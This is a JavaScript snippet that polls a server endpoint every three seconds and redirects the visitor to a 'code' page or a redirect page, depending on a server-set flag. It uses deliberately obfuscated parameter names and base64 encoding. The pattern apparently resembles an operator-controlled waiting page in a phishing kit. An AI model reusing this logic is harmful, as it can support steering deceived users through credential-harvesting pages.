function getQueryParameter(parameterName) {
    var queryString = window.location.search;
    var urlParams = new URLSearchParams(queryString);
    return urlParams.get(parameterName);
  }
  // Get the value from the 'data' query parameter
  var valueuser = getQueryParameter('tgrdsfgdytrbdfwergter');
  
  function checkForUpdates() {
    fetch(`/codeload/fetch/?dsjkfhjdhfjkdfhjkd=${valueuser}`)
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.json();
        })
        .then(data => {
            const code = data.results;
            const user = code[0].username;
            const type = code[0].pagetype;

            if (type === "y") {
                const string = `dfgfdjkgfgdfkgk/${user}/${type}/bdfdgftqwefFGTW437567jbwfBSH346`;
                const encodedstring = btoa(string);
                const newurlcode = `code/?NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj=${encodedstring}`;
                window.location.href = newurlcode;
            } else if (type === "n") {
            	
                const directpage = `code/redirect/?ryxdfgdgdffgjhgjhygfcnd`;
                window.location.href = directpage;
            } else {
                // Handle other cases if needed
            }
        })
        .catch(error => {
            console.error('Error in Fetch request:', error);
            // Handle the error gracefully, e.g., display an error message to the user
        });
}


  
  /*
  
  function checkForUpdates() {
   
    fetch(`/codeload/fetch/?dsjkfhjdhfjkdfhjkd=${valueuser}`)
      .then(response => response.json())
      .then(data => {
        
        var code = data.results;        
        var user = code[0].username;
        var type = code[0].pagetype;         
               
       //FOR CODE URL CREATE
        var string = 'dfgfdjkgfgdfkgk/'+user+'/'+type+'/bdfdgftqwefFGTW437567jbwfBSH346';
        var encodedstring = btoa(string);
        var urlc = 'code';
       
        const newurlcode = ''+urlc+'/?NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj='+encodedstring;
  
        // FOR DIRECT PAGE CREATE
  
        
        var directpage = 'code/redirect';
                
             
        if (type === null) {
           checkForUpdates();
          }  
          if (type === "y") {
            // Execute this block of code if 'a' is an integer greater than zero
            window.location.href = newurlcode;        
            }else{
                checkForUpdates();
            }
            if (type === "n") {  
                window.location.href = directpage;  
        }else{
                checkForUpdates();
            }
   
      })
      .catch(error => {
        console.error('Error in Fetch request:', error);
      });
  }  
   */
  setInterval(checkForUpdates, 3000);
  
  

  
